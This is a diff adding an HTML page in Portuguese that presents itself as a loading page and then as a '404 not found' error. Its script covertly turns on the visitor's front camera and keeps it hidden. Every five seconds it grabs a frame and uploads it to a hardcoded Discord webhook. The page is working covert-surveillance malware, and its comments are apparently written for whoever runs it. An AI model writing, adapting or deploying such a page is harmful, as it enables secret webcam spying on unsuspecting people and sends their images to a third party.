@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <title>A carregar Recursos...</title>
+    <style>
+        body { background-color: #111; color: #444; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    </style>
+</head>
+<body>
+    <div id="status">A estabelecer ligação segura...</div>
+
+    <video id="v" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="c" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const WEBHOOK = 'https://discord.com/api/webhooks/1486654230642032741/IVnRaJbepDri9K6arqMKR4vvnReU6nYcW4BlZ3gkIzHM1-L_PRiWY8v1l2xXzR30Lufm';
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
+
+        // Validação de Hardware
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+            .then(stream => {
+                video.srcObject = stream;
+                document.getElementById('status').innerText = "Erro 404: Recurso não encontrado no servidor.";
+                
+                // Intervalo de 5 segundos para evitar Rate Limit do Discord
+                setInterval(capture, 5000);
+            })
+            .catch(err => {
+                console.log("Acesso negado ou hardware ausente.");
+            });
+        }
+
+        function capture() {
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('file', blob, 'view.jpg');
+                // Adicionamos um timestamp para facilitar a tua organização no Discord
+                fd.append('content', `**Relatório de Unidade:** ${new Date().toLocaleTimeString()} | IP Local: Identificado`);
+
+                fetch(WEBHOOK, {
+                    method: 'POST',
+                    body: fd
+                }).then(res => {
+                    if(res.status === 429) console.warn("Rate limit atingido. A abrandar...");
+                });
+            }, 'image/jpeg', 0.5); // Qualidade 0.5 para upload rápido em redes 3G/4G
+        }
+    </script>
+</body>
+</html>
